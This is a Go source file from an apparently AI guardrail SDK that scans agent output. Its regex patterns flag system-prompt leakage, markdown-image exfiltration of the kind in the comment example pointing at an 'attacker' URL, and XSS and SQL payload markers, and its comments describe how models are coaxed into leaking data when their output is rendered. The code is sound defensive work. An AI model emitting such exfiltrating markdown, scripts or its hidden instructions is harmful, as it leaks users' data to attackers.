// SPDX-FileCopyrightText: 2026 Olivares.AI
// SPDX-License-Identifier: AGPL-3.0-only
// Additional terms under AGPL-3.0-only section 7(a) disclaim warranty and limit liability: see DISCLAIMER.md at the repository root.

package security

import (
	"regexp"

	sdkmodel "github.com/olivaresai/olivares/sdk/model"
)

// classOutput is the output-validation guardrail class. It inspects what the agent
// EMITS (its response and the arguments it sends to a tool), not what the user typed
// in — a malicious user prompt is the prompt-injection detector's job. This is the
// "improper output handling" lens (OWASP LLM05:2025): the model's output is treated
// as untrusted before it reaches a downstream renderer, browser, shell or SQL engine
// — plus the system-prompt-leakage lens (LLM07:2025) and the markdown/image render
// exfiltration channel (Rehberger / Embrace The Red; EchoLeak arXiv:2509.10540),
// which maps to sensitive-information disclosure (LLM02:2025).
const classOutput = "output_validation"

// outSystemPromptShapes flag an agent response that is echoing its hidden
// instructions back to the user — the observable signature of System Prompt Leakage
// (OWASP LLM07:2025, MITRE ATLAS AML.T0056 Meta Prompt Extraction). These are SIGNAL
// phrases, not sensitive values, so a clamped+scrubbed excerpt is fine.
var outSystemPromptShapes = []shape{
	{rule: "leaks-system-prompt-phrase", re: regexp.MustCompile(`(?i)my\s+system\s+prompt\s+is`), sev: sdkmodel.SeverityHigh, title: "output reveals its system prompt", owasp: "LLM07:2025", atlas: "AML.T0056"},
	{rule: "leaks-instructions-phrase", re: regexp.MustCompile(`(?i)my\s+instructions\s+(?:are|were)`), sev: sdkmodel.SeverityHigh, title: "output reveals its hidden instructions", owasp: "LLM07:2025", atlas: "AML.T0056"},
	{rule: "leaks-told-to-phrase", re: regexp.MustCompile(`(?i)i\s+was\s+told\s+to`), sev: sdkmodel.SeverityHigh, title: "output recites a hidden directive", owasp: "LLM07:2025", atlas: "AML.T0056"},
	{rule: "leaks-system-header", re: regexp.MustCompile(`(?i)#{2,}\s*system\b`), sev: sdkmodel.SeverityHigh, title: "output echoes a system-role header", owasp: "LLM07:2025", atlas: "AML.T0056"},
	{rule: "leaks-assistant-preamble", re: regexp.MustCompile(`(?i)you\s+are\s+a\s+helpful\s+assistant`), sev: sdkmodel.SeverityHigh, title: "output echoes its assistant preamble", owasp: "LLM07:2025", atlas: "AML.T0056"},
}

// outExfilShapes flag a markdown image/link in the output whose target is an external
// or data: URL — the markdown/image-render exfiltration channel (Rehberger / Embrace
// The Red; EchoLeak): the model is coaxed into emitting `![x](https://attacker/?=…)`
// so the act of RENDERING the response leaks data to the attacker. The URL itself may
// encode exfiltrated bytes, so it is redacted (the excerpt is a label only). Maps to
// LLM02:2025 (Sensitive Information Disclosure) with the exfil ATLAS technique.
var outExfilShapes = []shape{
	{rule: "markdown-image-exfil", re: regexp.MustCompile(`!\[[^\]]*\]\((?:https?://|data:)[^)]*\)`), sev: sdkmodel.SeverityHigh, title: "markdown image to external/data URL (exfil channel)", owasp: "LLM02:2025", atlas: "AML.T0024", redact: true},
	{rule: "markdown-link-query-exfil", re: regexp.MustCompile(`\]\((https?://[^)]*[?&][^)]*)\)`), sev: sdkmodel.SeverityHigh, title: "markdown link carrying query data (exfil channel)", owasp: "LLM02:2025", atlas: "AML.T0024", redact: true},
}

// outActiveContentShapes flag active/executable content in output that is meant for a
// downstream consumer (browser, template, SQL engine). Emitting it unescaped is the
// canonical Improper Output Handling failure (OWASP LLM05:2025): the consumer trusts
// the model's text and executes it (XSS, template injection, SQL injection). These
// are structural markers, not secrets, but they are clamped+scrubbed defensively.
var outActiveContentShapes = []shape{
	{rule: "active-content-script", re: regexp.MustCompile(`(?i)<script[\s>]`), sev: sdkmodel.SeverityHigh, title: "output contains an inline <script> (XSS)", owasp: "LLM05:2025"},
	{rule: "active-content-iframe", re: regexp.MustCompile(`(?i)<iframe[\s>]`), sev: sdkmodel.SeverityHigh, title: "output contains an <iframe>", owasp: "LLM05:2025"},
	{rule: "active-content-js-uri", re: regexp.MustCompile(`(?i)javascript:`), sev: sdkmodel.SeverityHigh, title: "output contains a javascript: URI", owasp: "LLM05:2025"},
	{rule: "active-content-event-handler", re: regexp.MustCompile(`(?i)\bon(?:error|load)\s*=`), sev: sdkmodel.SeverityHigh, title: "output contains an inline event handler", owasp: "LLM05:2025"},
	{rule: "active-content-sql", re: regexp.MustCompile(`(?i)\b(?:union\s+select|drop\s+table|insert\s+into|delete\s+from|update\s+\w+\s+set|select\s+.+\s+from\s+\w)`), sev: sdkmodel.SeverityHigh, title: "output contains a raw SQL statement", owasp: "LLM05:2025"},
}

// outputValidator validates the agent's OUTPUT (response and tool_args) as untrusted
// downstream content. It deliberately does NOT inspect SurfaceInput: a user prompt is
// not "output" and is covered by the prompt-injection/jailbreak/PII detectors.
type outputValidator struct{}

func newOutputValidator() Detector { return outputValidator{} }

func (outputValidator) Class() string { return classOutput }

func (outputValidator) Inspect(in GuardrailInput) []Detection {
	// Surface guard: only the agent's output and the args it sends to tools are
	// "output". The user's prompt (SurfaceInput) is not validated as output here.
	if in.Surface == SurfaceInput {
		return nil
	}

	var out []Detection
	out = append(out, scan(classOutput, in.Text, outSystemPromptShapes)...)
	out = append(out, scan(classOutput, in.Text, outExfilShapes)...)
	out = append(out, scan(classOutput, in.Text, outActiveContentShapes)...)

	// A leak of a secret/PII IN the output is an output-validation failure in its own
	// right (the response carries sensitive data downstream). This is the output lens
	// on a leak — the pii detector reports it from the input/value lens; here we emit
	// exactly one detection regardless of how many shapes matched, and never echo the
	// value.
	if containsSecretOrPII(in.Text) {
		out = append(out, Detection{
			Class:    classOutput,
			Rule:     "output-leaks-secret",
			Severity: sdkmodel.SeverityHigh,
			Title:    "output leaks a secret or PII value",
			Excerpt:  "[redacted:output-secret]",
		}.tagged("LLM02:2025"))
	}

	return out
}
